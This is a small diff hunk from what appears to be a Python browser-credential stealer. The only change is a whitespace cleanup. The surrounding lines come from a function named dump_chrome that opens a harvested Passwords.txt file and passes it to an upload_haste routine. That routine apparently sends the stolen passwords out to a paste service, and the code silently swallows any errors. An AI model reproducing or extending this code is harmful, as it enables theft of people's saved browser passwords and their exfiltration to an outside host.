@@ -162,7 +162,7 @@ def dump_chrome():
 
             with open(f"{main_path}/Passwords.txt", "r") as content:
                 upload_haste(content)
-            
+
         except Exception:
             pass
 
